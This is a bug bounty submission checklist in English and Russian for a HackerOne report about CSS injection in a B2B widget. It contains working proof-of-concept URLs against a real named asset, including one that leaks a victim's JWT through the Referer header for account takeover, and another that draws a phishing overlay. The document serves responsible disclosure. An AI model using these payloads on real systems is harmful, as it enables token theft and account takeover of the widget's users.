# HackerOne Submission Checklist

## 📁 Files in This Folder

### Main Report (SUBMIT THIS)

- `HACKERONE_CRITICAL_FINAL.md` - **Полный отчёт для копирования в HackerOne**

### Supporting Documentation

- `CSS_INJECTION_POC.md` - Детали CSS injection (опционально)

---

## 📸 Screenshots to Attach (ОБЯЗАТЕЛЬНО)

### 1. Referer Leak Proof (КРИТИЧНО!)

**Скриншот Network tab показывающий:**

- Запрос к `index.636befc6.js`
- Headers → Referer содержит полный URL с `_to=eyJ...` (JWT токен)

### 2. CSS Injection Visual Proof

**Скриншот виджета с красным фоном:**

```
URL: https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

### 3. API Access with Token (опционально)

**Скриншот ответа API с украденным токеном:**

- `/api/users/me/` показывающий email, UUID
- Transaction limits показывающие 900M ARS

---

## 📝 HackerOne Form Fields

### Title:

```
Critical: Unauthenticated Account Takeover via CSS Injection and Same-Origin Referer Leak in B2B Widget
```

### Weakness:

```
Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (CWE-79)
```

### Severity:

```
Critical (9.8)
```

### Asset:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html
```

---

## 🎯 PoC URLs for Report

### 1. Same-Origin Referer Leak (MAIN ATTACK):

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=VICTIM_JWT&_fn=x%27%3B%7D*%7Bbackground%3Aurl%28%27%2Fassets%2Findex.636befc6.js%27%29%21important%7D%2F*&_fo=y
```

### 2. Visual CSS Injection Proof:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

### 3. Phishing Overlay Proof:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7Dbody%3A%3Abefore%7Bcontent%3A%27HACKED%27%3Bposition%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Ablack%3Bcolor%3Ared%3Bfont-size%3A80px%3Bdisplay%3Aflex%3Balign-items%3Acenter%3Bjustify-content%3Acenter%3Bz-index%3A9999%7D/*&_fo=y
```

---

## ✅ Pre-Submission Checklist

- [ ] Скопировал текст из `HACKERONE_CRITICAL_FINAL.md`
- [ ] Прикрепил скриншот Referer с JWT токеном
- [ ] Прикрепил скриншот красного фона (CSS injection proof)
- [ ] Выбрал Severity: Critical
- [ ] Заполнил Title
- [ ] Проверил что PoC URLs работают

---

## 💰 Expected Bounty

| Severity | Range            |
| -------- | ---------------- |
| Critical | $1,500 - $8,000+ |

---

## 📞 After Submission

1. Ожидай ответа 1-5 дней
2. Будь готов ответить на уточняющие вопросы
3. Не публикуй детали до разрешения
